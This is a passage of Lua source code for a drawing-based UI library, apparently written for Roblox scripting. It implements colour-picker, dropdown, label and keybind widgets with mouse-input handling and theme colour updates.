                        Position = Vector2.new(InternalOutline.Position.X + 8 + 1, InternalOutline.Position.Y + 25 + 1),
                        Data = Library.Theme.Saturation,
                        Transparency = 1,
                        Visible = true,
                        ZIndex = 3
                    })
                    --
                    local InternalHueInline = Utility.AddDrawing(""Square"", {
                        Position = Vector2.new(InternalOutline.Position.X + InternalBase.Size.X + 14, InternalOutline.Position.Y + 26),
                        Size = Vector2.new(16, 196),
                        Thickness = 0,
                        Color = Library.Theme.Inline,
                        Visible = true,
                        Filled = true,
                        ZIndex = 3
                    })
                    --
                    local InternalHue = Utility.AddDrawing(""Image"", {
                        Size = Vector2.new(InternalHueInline.Size.X - 2, InternalHueInline.Size.Y - 2),
                        Position = Vector2.new(InternalHueInline.Position.X + 1, InternalHueInline.Position.Y + 1),
                        Data = Library.Theme.Hue,
                        Transparency = 1,
                        Visible = true,
                        ZIndex = 3
                    })
                    --
                    local InternalOutlineHuePicker = Utility.AddDrawing(""Square"", {
                        Position = Vector2.new(InternalOutline.Position.X + InternalBase.Size.X + 12, InternalOutline.Position.Y + 26),
                        Size = Vector2.new(InternalHueInline.Size.X + 2, 6),
                        Thickness = 2,
                        Color = Library.Theme.Outline,
                        Visible = true,
                        Filled = false,
                        ZIndex = 3
                    })
                    --
                    local InternalHuePicker = Utility.AddDrawing(""Square"", {
                        Position = Vector2.new(InternalOutlineHuePicker.Position.X + 1, InternalOutlineHuePicker.Position.Y + 1),
                        Size = Vector2.new(InternalOutlineHuePicker.Size.X - 2, InternalOutlineHuePicker.Size.Y - 2),
                        Thickness = 2,
                        Color = Library.Theme.Text,
                        Visible = true,
                        Filled = false,
                        ZIndex = 3
                    })
                    --
                    
                    --
                    local Cursor = Utility.AddDrawing(""Image"", {
                        Size = Vector2.new(6, 6),
                        Data = Library.Theme.SaturationCursor,
                        Transparency = 1,
                        Visible = true,
                        ZIndex = 6
                    })
                    --
                    local InternalInlineHex = Utility.AddDrawing(""Square"", {
                        Size = Vector2.new(80 - 2, 18 - 2),
                        Position = Vector2.new(InternalOutline.Position.X + 8 + 1, InternalOutline.Position.Y + InternalSaturation.Size.Y + 30 + 1),
                        Thickness = 0,
                        Color = Library.Theme.Inline,
                        Visible = true,
                        Filled = true,
                        ZIndex = 3
                    })
                    --
                    local InternalOutlineHex = Utility.AddDrawing(""Square"", {
                        Size = Vector2.new(InternalInlineHex.Size.X - 2, InternalInlineHex.Size.Y - 2),
                        Position = Vector2.new(InternalInlineHex.Position.X + 1, InternalInlineHex.Position.Y + 1),
                        Thickness = 0,
                        Color = Library.Theme.LightContrast, --Library.Theme.Outline,
                        Visible = true,
                        Filled = true,
                        ZIndex = 3
                    })
                    --
                    local InternalHex = Utility.AddDrawing(""Text"", {
                        Text = (""#%s""):format(tostring(Colorpicker.HexColor)),
                        Position = Vector2.new(InternalOutlineHex.Position.X + (InternalOutlineHex.Size.X / 2), InternalOutlineHex.Position.Y),
                        Center = true,
                        Outline = false,
                        Font = Library.Theme.Font,
                        Size = Library.Theme.TextSize,
                        Color = Library.Theme.Text,
                        Visible = true,
                        ZIndex = 3
                    })
                    --
                    local InternalInlineRGB = Utility.AddDrawing(""Square"", {
                        Size = Vector2.new(130 - 2, 18 - 2),
                        Position = Vector2.new(InternalOutline.Position.X + 90 + 1, InternalOutline.Position.Y + InternalSaturation.Size.Y + 30 + 1),
                        Thickness = 0,
                        Color = Library.Theme.Inline,
                        Visible = true,
                        Filled = true,
                        ZIndex = 3
                    })
                    --
                    local InternalOutlineRGB = Utility.AddDrawing(""Square"", {
                        Size = Vector2.new(InternalInlineRGB.Size.X - 2, InternalInlineRGB.Size.Y - 2),
                        Position = Vector2.new(InternalInlineRGB.Position.X + 1, InternalInlineRGB.Position.Y + 1),
                        Thickness = 0,
                        Color = Library.Theme.LightContrast, --Library.Theme.Outline,
                        Visible = true,
                        Filled = true,
                        ZIndex = 3
                    })
                    --
                    local InternalRGB = Utility.AddDrawing(""Text"", {
                        Text = (""%s, %s, %s""):format(math.floor(Colorpicker.Color.R * 255), math.floor(Colorpicker.Color.G * 255), math.floor(Colorpicker.Color.B * 255)),
                        Position = Vector2.new(InternalOutlineRGB.Position.X + (InternalOutlineRGB.Size.X / 2), InternalOutlineRGB.Position.Y),
                        Center = true,
                        Outline = false,
                        Font = Library.Theme.Font,
                        Size = Library.Theme.TextSize,
                        Color = Library.Theme.Text,
                        Visible = true,
                        ZIndex = 3
                    })
                    --
                    
                    --
                    local InternalInlineRainbow = Utility.AddDrawing(""Square"", {
                        Size = Vector2.new(100 - 2, 18 - 2),
                        Position = Vector2.new((InternalOutline.Position.X + InternalOutline.Size.X) - 100 - 2 + 1, InternalOutline.Position.Y + 4 + 1),
                        Thickness = 0,
                        Color = Library.Theme.Inline,
                        Visible = true,
                        Filled = true,
                        ZIndex = 3
                    })
                    --
                    local InternalOutlineRainbow = Utility.AddDrawing(""Square"", {
                        Size = Vector2.new(InternalInlineRainbow.Size.X - 2, InternalInlineRainbow.Size.Y - 2),
                        Position = Vector2.new(InternalInlineRainbow.Position.X + 1, InternalInlineRainbow.Position.Y + 1),
                        Thickness = 0,
                        Color = Library.Theme.LightContrast, --Library.Theme.Outline,
                        Visible = true,
                        Filled = true,
                        ZIndex = 3
                    })
                    --
                    local InternalRainbow = Utility.AddDrawing(""Text"", {
                        Text = ""Rainbow"",
                        Position = Vector2.new(InternalOutlineRainbow.Position.X + (InternalOutlineRainbow.Size.X / 2), InternalOutlineRainbow.Position.Y),
                        Center = true,
                        Outline = false,
                        Font = Library.Theme.Font,
                        Size = Library.Theme.TextSize,
                        Color = Library.Theme.Text,
                        Visible = true,
                        ZIndex = 3
                    })
                    --
                    function Colorpicker:Drop(State)
                        InternalInline.Visible = State
                        InternalOutline.Visible = State
                        InternalTitle.Visible = State
                        InternalBaseInline.Visible = State
                        InternalBase.Visible = State
                        InternalSaturation.Visible = State
                        InternalHueInline.Visible = State
                        InternalHue.Visible = State
                        InternalOutlineHex.Visible = State
                        InternalInlineHex.Visible = State
                        InternalHex.Visible = State
                        InternalInlineRGB.Visible = State
                        InternalOutlineRGB.Visible = State
                        InternalRGB.Visible = State
                        InternalInlineRainbow.Visible = State
                        InternalOutlineRainbow.Visible = State
                        InternalRainbow.Visible = State
                        InternalTopline.Visible = State
                        Cursor.Visible = State
                        InternalOutlineHuePicker.Visible = State
                        InternalHuePicker.Visible = State
                        Tab.Dropdowns[Side][ColorpickerTitle.Text] = State
                    end
                    --
                    Colorpicker.Offsets.X = InternalBase.Position.X
                    Colorpicker.Offsets.Y = InternalBase.Position.Y
                    --
                    function Colorpicker:SetHue(Options)
                        local Percent = Options.Percent or Options.Value
    
                        Colorpicker.Colors.HSV[1] = Options.Value

                        local HSVColor = Color3.fromHSV(Colorpicker.Colors.HSV[1], Colorpicker.Colors.HSV[2], Colorpicker.Colors.HSV[3])
                        
                        InternalOutlineHuePicker.Position = Vector2.new(InternalOutline.Position.X + InternalBase.Size.X + 12, InternalHue.Position.Y + (InternalHue.Size.Y * Percent) - 4)
                        InternalHuePicker.Position = Vector2.new(InternalOutlineHuePicker.Position.X + 1, InternalOutlineHuePicker.Position.Y + 1)

                        InternalBase.Color = Color3.fromHSV(Colorpicker.Colors.HSV[1], 1, 1)

                        InternalHex.Text = (""#%s""):format(tostring(HSVColor:ToHex()))
                        
                        local CalculateRGB = Color3.fromRGB(math.floor((HSVColor.R * 255)), math.floor((HSVColor.G * 255)), math.floor((HSVColor.B * 255)))
                        InternalRGB.Text = (""%s, %s, %s""):format(math.floor(CalculateRGB.R * 255), math.floor(CalculateRGB.G * 255), math.floor(CalculateRGB.B * 255))

                        ColorpickerBase.Color = HSVColor

                        if not Options.Visual then
                            Library.Flags[Colorpicker.Flag] = HSVColor
                            Colorpicker.Callback(HSVColor)
                        end
                    end
                    --
                    function Colorpicker:RefreshHue()
                        local PercentHue = math.clamp(((Mouse.Y + 36) - InternalHue.Position.Y) / (InternalHue.Size.Y), 0, 1)
                        local ValueHue = math.floor((0 + (1 - 0) * PercentHue) * Colorpicker.Decimals) / Colorpicker.Decimals
                        ValueHue = math.clamp(ValueHue, 0, 1)
                        self:SetHue({
                            Value = ValueHue, 
                            Percent = PercentHue
                        })
                    end
                    --
                    function Colorpicker:SetSaturationX(Options)
                        local PercentX = Options.Percent or Options.Value

                        local HSVColor = Color3.fromHSV(Colorpicker.Colors.HSV[1], Colorpicker.Colors.HSV[2], Colorpicker.Colors.HSV[3])
                        Colorpicker.Colors.HSV[2] = Options.Value

                        Cursor.Position = Vector2.new(InternalBase.Position.X + (InternalBase.Size.X * PercentX) - 4, Colorpicker.Offsets.Y)
                        Colorpicker.Offsets.X = Cursor.Position.X

                        InternalHex.Text = (""#%s""):format(tostring(HSVColor:ToHex()))

                        local CalculateRGB = Color3.fromRGB(math.floor((HSVColor.R * 255)), math.floor((HSVColor.G * 255)), math.floor((HSVColor.B * 255)))
                        InternalRGB.Text = (""%s, %s, %s""):format(math.floor(CalculateRGB.R * 255), math.floor(CalculateRGB.G * 255), math.floor(CalculateRGB.B * 255))

                        ColorpickerBase.Color = HSVColor

                        if not Options.Visual then
                            Library.Flags[Colorpicker.Flag] = HSVColor
                            Colorpicker.Callback(HSVColor)
                        end
                    end
                    --
                    function Colorpicker:SetSaturationY(Options)
                        local PercentY = Options.Percent or 1 - Options.Value

                        local HSVColor = Color3.fromHSV(Colorpicker.Colors.HSV[1], Colorpicker.Colors.HSV[2], Colorpicker.Colors.HSV[3])
                        Colorpicker.Colors.HSV[3] = Options.Value
    
                        Cursor.Position = Vector2.new(Colorpicker.Offsets.X, InternalBase.Position.Y + (InternalBase.Size.Y * PercentY) - 4)
                        Colorpicker.Offsets.Y = Cursor.Position.Y

                        InternalHex.Text = (""#%s""):format(tostring(HSVColor:ToHex()))

                        local CalculateRGB = Color3.fromRGB(math.floor((HSVColor.R * 255)), math.floor((HSVColor.G * 255)), math.floor((HSVColor.B * 255)))
                        InternalRGB.Text = (""%s, %s, %s""):format(math.floor(CalculateRGB.R * 255), math.floor(CalculateRGB.G * 255), math.floor(CalculateRGB.B * 255))

                        ColorpickerBase.Color = HSVColor

                        if not Options.Visual then
                            Library.Flags[Colorpicker.Flag] = HSVColor
                            Colorpicker.Callback(HSVColor)
                        end
                    end
                    --
                    function Colorpicker:RefreshSaturation()
                        local PercentX = math.clamp((Mouse.X - InternalSaturation.Position.X) / (InternalSaturation.Size.X), 0, 1)
                        local ValueX = math.floor((1 * PercentX) * Colorpicker.Decimals) / Colorpicker.Decimals
                        ValueX = math.clamp(ValueX, 0, 1)
                        self:SetSaturationX({
                            Value = ValueX, 
                            Percent = PercentX
                        })
                        --
                        local PercentY = math.clamp(((Mouse.Y + 36) - InternalSaturation.Position.Y) / (InternalSaturation.Size.Y), 0, 1)
                        local ValueY = 1 - math.floor((1 * PercentY) * Colorpicker.Decimals) / Colorpicker.Decimals
                        ValueY = math.clamp(ValueY, 0, 1)
                        self:SetSaturationY({
                            Value = ValueY, 
                            Percent = PercentY
                        })
                    end
                    --
                    Utility.AddConnection(UserInput.InputEnded, function(Input, Useless)
                        
                        for Index, Value in pairs(Tab.Dropdowns[Side]) do
                            if Index ~= ColorpickerTitle.Text and Value then
                                return
                            end
                        end
                        if Input.UserInputType == Enum.UserInputType.MouseButton1 then
                            Colorpicker.HueDragging = false
                            Colorpicker.SaturationDragging = false
                        end
                    end)
    
                    Utility.AddConnection(UserInput.InputChanged, function(Input, Useless)
                        if Utility.OnMouse(ColorpickerInline) then
                            ColorpickerInline.Color = Library.Theme.Accent[1]
                        else
                            ColorpickerInline.Color = Library.Theme.Inline
                        end
                        if Utility.OnMouse(ColorpickerInline) then
                            ColorpickerInline.Color = Library.Theme.Accent[1]
                        else
                            ColorpickerInline.Color = Library.Theme.Inline
                        end
                        
                        if Input.UserInputType == Enum.UserInputType.MouseMovement then
                            for Index, Value in pairs(Tab.Dropdowns[Side]) do
                                if Index ~= ColorpickerTitle.Text and Value then
                                    return
                                end
                            end
                            if Colorpicker.HueDragging then
                                Colorpicker:RefreshHue()
                            elseif Colorpicker.SaturationDragging then
                                Colorpicker:RefreshSaturation()
                            end
                        end
                    end)
                    --
                    Utility.AddConnection(UserInput.InputBegan, function(Input, Useless)
                        
                        if Input.UserInputType == Enum.UserInputType.MouseButton1 then
                            for Index, Value in pairs(Tab.Dropdowns[Side]) do
                                if Index ~= ColorpickerTitle.Text and Value then
                                    return
                                end
                            end
                            if Utility.OnMouse(ColorpickerInline) then
                                Colorpicker.Dropped = not Colorpicker.Dropped
                                Tab.Dropdowns[Side][ColorpickerTitle.Text] = Colorpicker.Dropped
                                Colorpicker:Drop(Colorpicker.Dropped)
                            elseif Utility.OnMouse(InternalSaturation) then
                                Colorpicker:RefreshSaturation()
                                Colorpicker.SaturationDragging = true
                            elseif Utility.OnMouse(InternalHue) then
                                Colorpicker:RefreshHue()
                                Colorpicker.HueDragging = true
                            elseif Utility.OnMouse(InternalInlineRainbow) then
                                Colorpicker.Rainbow = not Colorpicker.Rainbow
                                InternalRainbow.Color = Colorpicker.Rainbow and Library.Theme.Accent[1] or Library.Theme.Text
                                if not Colorpicker.Rainbow then
                                    Colorpicker:SetHue({Value = Colorpicker.Colors.HSV[1]})
                                    Colorpicker:SetSaturationX({Value = Colorpicker.Colors.HSV[2]})
                                    Colorpicker:SetSaturationY({Value = Colorpicker.Colors.HSV[3]})
                                end
                            else
                                Colorpicker.Dropped = false
                                Tab.Dropdowns[Side][ColorpickerTitle.Text] = Colorpicker.Dropped
                                Colorpicker:Drop(Colorpicker.Dropped)
                            end
                        end
                    end)
                    --
                    Utility.AddConnection(RunService.RenderStepped, function(Input, Useless)
                        if Colorpicker.Rainbow then
                            -- Colorpicker:SetHue({Value = tick() % 2 / 2, Visual = true})
                            -- Colorpicker:SetSaturationX({Value = 0.5, Visual = true})
                            -- Colorpicker:SetSaturationY({Value = 1, Visual = true})
                            Library.Flags[Colorpicker.Flag] = Color3.fromHSV(tick() % 2 / 2, 0.5, 1)
                            Colorpicker.Callback(Color3.fromHSV(tick() % 2 / 2, 0.5, 1))
                        end
                    end)
                    --
                    Colorpicker:SetHue({Value = Colorpicker.Colors.HSV[1]})
                    Colorpicker:SetSaturationX({Value = Colorpicker.Colors.HSV[2]})
                    Colorpicker:SetSaturationY({Value = Colorpicker.Colors.HSV[3]})
                    --
                    Section.ContentAxis = Section.ContentAxis + ColorpickerBase.Size.Y + 10
                    Tab.SectionAxis = {
                        Side == ""Left"" and Tab.SectionAxis[1] +  ColorpickerBase.Size.Y + 10 or Tab.SectionAxis[1], 
                        Side == ""Right"" and Tab.SectionAxis[2] +  ColorpickerBase.Size.Y + 10 or Tab.SectionAxis[2]
                    }
                    --
                    self:UpdateSizeY(Section.ContentAxis + ColorpickerBase.Size.Y)
                    --
                    Tab[""Render""][#Tab[""Render""] + 1] = ColorpickerTitle
                    Tab[""Render""][#Tab[""Render""] + 1] = ColorpickerInline
                    Tab[""Render""][#Tab[""Render""] + 1] = ColorpickerOutline
                    Tab[""Render""][#Tab[""Render""] + 1] = ColorpickerBase
                    Tab[""Render""][#Tab[""Render""] + 1] = ColorpickerGradient
                    --
                    Colorpicker:Drop(false)
                    --
                    return Colorpicker
                end
                --
                function Section:Dropdown(Options)
                    local Dropdown = {
                        TypeOf = ""Dropdown"",
                        Axis = Section.ContentAxis,
                        List = List or {""""},
                        ListRender = {
                            Texts = {},
                            Objects = {}
                        }, 
                        Show = true,
                        Selected = Options.Default or Options.List[1],
                        BaseSize = 16,
                        Callback = typeof(Options.Callback) == ""function"" and Options.Callback or function() end
                    }
                    --
                    Options.Flag = Options.Flag or ""AWGWJIjgAWJIGIJAWG""
                    Library.Flags[Options.Flag] = Dropdown.Selected
                    --
                    local DropdownInline = Utility.AddDrawing(""Square"", {
                        Position = Vector2.new(SectionInline.Position.X + 8, SectionInline.Position.Y + 23 + Dropdown.Axis + 16),
                        Size = Vector2.new(SectionOutline.Size.X - 12, Dropdown.BaseSize),
                        Thickness = 0,
                        Color = Library.Theme.Inline,
                        Visible = true,
                        Filled = true
                    })
                    --
                    local DropdownOutline = Utility.AddDrawing(""Square"", {
                        Size = Vector2.new(DropdownInline.Size.X - 2, DropdownInline.Size.Y - 2),
                        Position = Vector2.new(DropdownInline.Position.X + 1, DropdownInline.Position.Y + 1),
                        Thickness = 0,
                        Color = Library.Theme.LightContrast, --Library.Theme.Outline,
                        Visible = true,
                        Filled = true
                    })
                    --
                    local DropdownGradient = Utility.AddDrawing(""Image"", {
                        Size = Vector2.new(DropdownInline.Size.X - 2, DropdownInline.Size.Y - 2),
                        Position = Vector2.new(DropdownInline.Position.X + 1, DropdownInline.Position.Y + 1),
                        Data = Library.Theme.Gradient,
                        Transparency = 1,
                        Visible = true
                    })
                    --
                    local DropdownTitle = Utility.AddDrawing(""Text"", {
                        Text = Options.Title,
                        Position = Vector2.new(DropdownInline.Position.X + 2, DropdownInline.Position.Y - 16),
                        Center = false,
                        Outline = false,
                        Font = Library.Theme.Font,
                        Size = Library.Theme.TextSize,
                        Color = Library.Theme.Text,
                        Visible = true,
                        ZIndex = 2
                    })
                    --
                    local DropdownValue = Utility.AddDrawing(""Text"", {
                        Text = Options.Default,
                        Position = Vector2.new(DropdownOutline.Position.X + 4, DropdownOutline.Position.Y),
                        Center = false,
                        Outline = false,
                        Font = Library.Theme.Font,
                        Size = Library.Theme.TextSize,
                        Color = Library.Theme.Text,
                        Visible = true,
                        ZIndex = 2
                    })
                    --
                    local DropdownSymbol = Utility.AddDrawing(""Text"", {
                        Text = ""+"",
                        Position = Vector2.new(DropdownOutline.Position.X + DropdownOutline.Size.X - 12, DropdownOutline.Position.Y),
                        Center = false,
                        Outline = false,
                        Font = Library.Theme.Font,
                        Size = Library.Theme.TextSize,
                        Color = Library.Theme.Text,
                        Visible = true,
                        ZIndex = 2
                    })
                    --
                    local DropdownDetect = Utility.AddDrawing(""Square"", {
                        Thickness = 0,
                        Transparency = 0,
                        Color = Library.Theme.Hitbox, --Library.Theme.Outline,
                        Visible = true,
                        Filled = true
                    })
                    --
                    function Dropdown:Set(Selected)
                        for Index, Value in pairs(Dropdown.ListRender.Texts) do
                            Value.Color = Library.Theme.Text
                        end
                        Dropdown.ListRender.Texts[Selected].Color = Library.Theme.Accent[1]
                        Dropdown.Selected = Selected
                        DropdownValue.Text = Selected
                        Dropdown.Callback(Dropdown.Selected)
                        Library.Flags[Options.Flag] = Dropdown.Selected
                    end
                    --
                    function Dropdown:ShowList(State)
                        for Index, Value in pairs(Dropdown.ListRender.Objects) do
                            Value.Visible = State
                        end
                        --
                        for Index, Value in pairs(Dropdown.ListRender.Texts) do
                            Value.Visible = State
                        end
                        --
                        Tab.Dropdowns[Side][DropdownTitle.Text] = State
                    end
                    --
                    Utility.AddConnection(Library.Communication.Event, function(Type, Color)
                        if Type == ""Accent"" then
                            Dropdown.ListRender.Texts[Dropdown.Selected].Color = Color
                        elseif Type == ""LightContrast"" then
                            DropdownOutline.Color = Color
                        elseif Type == ""Text"" then
                            DropdownTitle.Color = Color
                            DropdownSymbol.Color = Color
                            DropdownValue.Color = Color
                        elseif Type == ""Inline"" then
                            DropdownInline.Color = Color
                        end
                    end)
                    --
                    for Index, Value in pairs(Options.List) do
                        local SelectionInline = Utility.AddDrawing(""Square"", {
                            Position = Vector2.new(DropdownInline.Position.X, (DropdownInline.Position.Y + (Index * (18)))),
                            Size = Vector2.new(SectionOutline.Size.X - 12, 18),
                            Thickness = 0,
                            Color = Library.Theme.Inline,
                            Visible = true,
                            Filled = true,
                            ZIndex = 3
                        })
                        --
                        local SelectionOutline = Utility.AddDrawing(""Square"", {
                            Size = Vector2.new(SelectionInline.Size.X - 2, SelectionInline.Size.Y - 2),
                            Position = Vector2.new(SelectionInline.Position.X + 1, SelectionInline.Position.Y + 1),
                            Thickness = 0,
                            Color = Library.Theme.LightContrast, --Library.Theme.Outline,
                            Visible = true,
                            Filled = true,
                            ZIndex = 3
                        })
                        --
                        local SelectionGradient = Utility.AddDrawing(""Image"", {
                            Size = Vector2.new(SelectionInline.Size.X - 2, SelectionInline.Size.Y - 2),
                            Position = Vector2.new(SelectionInline.Position.X + 1, SelectionInline.Position.Y + 1),
                            Data = Library.Theme.Gradient,
                            Transparency = 1,
                            Visible = true,
                            ZIndex = 3
                        })
                        --
                        local SelectionTitle = Utility.AddDrawing(""Text"", {
                            Text = Value,
                            Position = Vector2.new(SelectionInline.Position.X + 6, SelectionInline.Position.Y + 3),
                            Center = false,
                            Outline = false,
                            Font = Library.Theme.Font,
                            Size = Library.Theme.TextSize,
                            Color = Library.Theme.Text,
                            Visible = true,
                            ZIndex = 3
                        })
                        --
                        Utility.AddConnection(Library.Communication.Event, function(Type, Color)
                            if Type == ""LightContrast"" then
                                SelectionOutline.Color = Color
                            elseif Type == ""Text"" then
                                SelectionTitle.Color = Color
                            elseif Type == ""Inline"" then
                                SelectionInline.Color = Color
                            end
                        end)
                        --
                        Utility.AddConnection(UserInput.InputChanged, function(Input, Useless)
                            if Input.UserInputType == Enum.UserInputType.MouseMovement then
                                if Utility.OnMouse(SelectionInline) then
                                    SelectionInline.Color = Library.Theme.Accent[1]
                                else
                                    SelectionInline.Color = Library.Theme.Inline
                                end
                            end
                        end)
                        --
                        Dropdown.ListRender.Objects[#Dropdown.ListRender.Objects + 1] = SelectionInline
                        Dropdown.ListRender.Objects[#Dropdown.ListRender.Objects + 1] = SelectionOutline
                        Dropdown.ListRender.Objects[#Dropdown.ListRender.Objects + 1] = SelectionGradient
                        Dropdown.ListRender.Texts[Value] = SelectionTitle
                        --
                        Utility.AddConnection(UserInput.InputBegan, function(Input, Useless)
                            if Useless then
                                return
                            end
                            for Index, Value in pairs(Tab.Dropdowns[Side]) do
                                if Index ~= DropdownTitle.Text and Value then
                                    return
                                end
                            end
                            if Input.UserInputType == Enum.UserInputType.MouseButton1 and Utility.OnMouse(SelectionInline) then
                                Dropdown:Set(Value)
                            end
                        end)
                        --
                    end
                    --
                    DropdownDetect.Position = Vector2.new(DropdownInline.Position.X, DropdownInline.Position.Y + DropdownInline.Size.Y)
                    DropdownDetect.Size = Vector2.new(SectionOutline.Size.X - 12, (#Options.List * Dropdown.BaseSize) + Dropdown.BaseSize)
                    --
                    Dropdown:Set(Dropdown.Selected)
                    Dropdown:ShowList(false)
                    --
                    Utility.AddConnection(UserInput.InputBegan, function(Input, Useless)
                        
                        if Input.UserInputType == Enum.UserInputType.MouseButton1 then
                            if Utility.OnMouse(DropdownInline) then
                                for Index, Value in pairs(Tab.Dropdowns[Side]) do
                                    if Index ~= DropdownTitle.Text and Value then
                                        return
                                    end
                                end
                                Dropdown.Show = not Dropdown.Show
                                Tab.Dropdowns[Side][DropdownTitle.Text] = Dropdown.Show
                                DropdownSymbol.Text = Dropdown.Show and ""-"" or ""+""
                                Dropdown:ShowList(Dropdown.Show)
                            elseif not Utility.OnMouse(DropdownDetect) then
                                Dropdown.Show = false
                                Tab.Dropdowns[Side][DropdownTitle.Text] = Dropdown.Show
                                DropdownSymbol.Text = ""+""
                                Dropdown:ShowList(false)
                            end
                        end
                    end)
                    --
                    Utility.AddConnection(UserInput.InputChanged, function(Input, Useless)
                        if Input.UserInputType == Enum.UserInputType.MouseMovement then
                            if Utility.OnMouse(DropdownInline) then
                                DropdownInline.Color = Library.Theme.Accent[1]
                            else
                                DropdownInline.Color = Library.Theme.Inline
                            end
                        end
                    end)
                    --
                    Section.ContentAxis = Section.ContentAxis + DropdownOutline.Size.Y + 20
                    Tab.SectionAxis = {
                        Side == ""Left"" and Tab.SectionAxis[1] + DropdownOutline.Size.Y + 20 or Tab.SectionAxis[1], 
                        Side == ""Right"" and Tab.SectionAxis[2] + DropdownOutline.Size.Y + 20 or Tab.SectionAxis[2]
                    }
                    --
                    self:UpdateSizeY(Section.ContentAxis + DropdownOutline.Size.Y)
                    --
                    Tab[""Render""][#Tab[""Render""] + 1] = DropdownInline
                    Tab[""Render""][#Tab[""Render""] + 1] = DropdownOutline
                    Tab[""Render""][#Tab[""Render""] + 1] = DropdownTitle
                    Tab[""Render""][#Tab[""Render""] + 1] = DropdownGradient
                    Tab[""Render""][#Tab[""Render""] + 1] = DropdownSymbol
                    Tab[""Render""][#Tab[""Render""] + 1] = DropdownValue
                    --
                    return Dropdown
                end
                --
                function Section:Label(Title)
                    local Label = {
                        Axis = Section.ContentAxis
                    }
                    --
                    local LabelTitle = Utility.AddDrawing(""Text"", {
                        Text = Title,
                        Position = Vector2.new(SectionInline.Position.X + 6, SectionInline.Position.Y + 23 + Label.Axis),
                        Center = false,
                        Outline = false,
                        Font = Library.Theme.Font,
                        Size = Library.Theme.TextSize,
                        Color = Library.Theme.Text,
                        Visible = true,
                        ZIndex = 2
                    })
                    --
                    function Label:Set(Txt)
                        LabelTitle.Text = Txt
                    end
                    --
                    Section.ContentAxis = Section.ContentAxis + LabelTitle.Size + 8
                    Tab.SectionAxis = {
                        Side == ""Left"" and Tab.SectionAxis[1] +  LabelTitle.Size + 8 or Tab.SectionAxis[1], 
                        Side == ""Right"" and Tab.SectionAxis[2] +  LabelTitle.Size + 8 or Tab.SectionAxis[2]
                    }
                    --
                    self:UpdateSizeY(Section.ContentAxis + LabelTitle.Size)
                    --
                    Tab[""Render""][#Tab[""Render""] + 1] = LabelTitle
                    --
                    return Label
                end
                --
                function Section:Keybind(Options)
                    local Keybind = {
                        Axis = Section.ContentAxis,
                        Title = Options.Title and Options.Title or ""LOL"",
                        EnumType = Options.Key.EnumType == Enum.KeyCode and ""KeyCode"" or ""UserInputType"",
                        Key = Options.Key or Enum.UserInputType.MouseButton2,
                        StateType = Options.StateType or ""Hold"",
                        State = false,
                        Shorten = """",
                        Binding = false,
                        Dropped = false,
                        Callback = typeof(Options.Callback) == ""function"" and Options.Callback or function() end
                    }
                    --
                    if Keybind.StateType == ""Always"" then
                        Keybind.Callback(Keybind.State, Keybind.Key)
                    end
                    --
                    Keybind.Shorten = Library.Keys.Shortened[Keybind.Key.Name] or Keybind.Key.Name
                    --
                    local KeybindTitle = Utility.AddDrawing(""Text"", {
                        Text = Options.Title,
                        Position = Vector2.new(SectionInline.Position.X + 6, SectionInline.Position.Y + 26 + Keybind.Axis),
                        Center = false,
                        Outline = false,
                        Font = Library.Theme.Font,
                        Size = Library.Theme.TextSize,
                        Color = Library.Theme.Text,
                        Visible = true,
                        ZIndex = 2
                    })
                    --
                    local KeybindInline = Utility.AddDrawing(""Square"", {
                        Position = Vector2.new(SectionInline.Position.X + SectionInline.Size.X - 40 - 6, SectionInline.Position.Y + 23 + Keybind.Axis + 2),
                        Size = Vector2.new(40, 14),
                        Thickness = 0,
                        Color = Library.Theme.Inline,
                        Visible = true,
                        Filled = true
                    })
                    --
                    local KeybindOutline = Utility.AddDrawing(""Square"", {
                        Size = Vector2.new(KeybindInline.Size.X - 2, KeybindInline.Size.Y - 2),
                        Position = Vector2.new(KeybindInline.Position.X + 1, KeybindInline.Position.Y + 1),
                        Thickness = 0,
                        Color = Library.Theme.LightContrast, --Library.Theme.Outline,
                        Visible = true,
                        Filled = true
                    })
                    --
                    local KeybindGradient = Utility.AddDrawing(""Image"", {
                        Size = Vector2.new(KeybindInline.Size.X - 2, KeybindInline.Size.Y - 2),
                        Position = Vector2.new(KeybindInline.Position.X + 1, KeybindInline.Position.Y + 1),
                        Data = Library.Theme.Gradient,
                        Transparency = 1,
                        Visible = true
                    })
                    --
                    local KeybindValue = Utility.AddDrawing(""Text"", {
                        Text = Keybind.Shorten,
                        Position = Vector2.new(KeybindInline.Position.X + (KeybindInline.Size.X / 2), KeybindInline.Position.Y),
                        Center = true,
                        Outline = false,
                        Font = Library.Theme.Font,
                        Size = Library.Theme.TextSize,
                        Color = Library.Theme.Text,
                        Visible = true,
                        ZIndex = 2
                    })
                    --
                    local KeybindHoldInline = Utility.AddDrawing(""Square"", {
                        Position = Vector2.new(SectionInline.Position.X + SectionInline.Size.X + 2 - 6, SectionInline.Position.Y + 23 + Keybind.Axis + 2),
                        Size = Vector2.new(60, 16),
                        Thickness = 0,
                        Color = Library.Theme.Inline,
                        Visible = true,
                        Filled = true
                    })
                    --
                    local KeybindHoldOutline = Utility.AddDrawing(""Square"", {
                        Size = Vector2.new(KeybindHoldInline.Size.X - 2, KeybindHoldInline.Size.Y - 2),
                        Position = Vector2.new(KeybindHoldInline.Position.X + 1, KeybindHoldInline.Position.Y + 1),
                        Thickness = 0,
                        Color = Library.Theme.LightContrast, --Library.Theme.Outline,
                        Visible = true,
                        Filled = true
                    })
                    --
                    local KeybindHoldGradient = Utility.AddDrawing(""Image"", {
                        Size = Vector2.new(KeybindHoldInline.Size.X - 2, KeybindHoldInline.Size.Y - 2),
                        Position = Vector2.new(KeybindHoldInline.Position.X + 1, KeybindHoldInline.Position.Y + 1),
                        Data = Library.Theme.Gradient,
                        Transparency = 1,
                        Visible = true
                    })
                    --
                    local KeybindHoldValue = Utility.AddDrawing(""Text"", {
                        Text = ""Hold"",
                        Position = Vector2.new(KeybindHoldInline.Position.X + (KeybindHoldInline.Size.X / 2), KeybindHoldInline.Position.Y),
                        Center = true,
                        Outline = false,
                        Font = Library.Theme.Font,
                        Size = Library.Theme.TextSize,
                        Color = Library.Theme.Text,
                        Visible = true,
                        ZIndex = 2
                    })
                    --
                    local KeybindToggleInline = Utility.AddDrawing(""Square"", {
                        Position = Vector2.new(SectionInline.Position.X + SectionInline.Size.X + 2 - 6, SectionInline.Position.Y + 23 + Keybind.Axis + 2 + 18),
                        Size = Vector2.new(60, 16),
                        Thickness = 0,
                        Color = Library.Theme.Inline,
                        Visible = true,
                        Filled = true
                    })
                    --
                    local KeybindToggleOutline = Utility.AddDrawing(""Square"", {
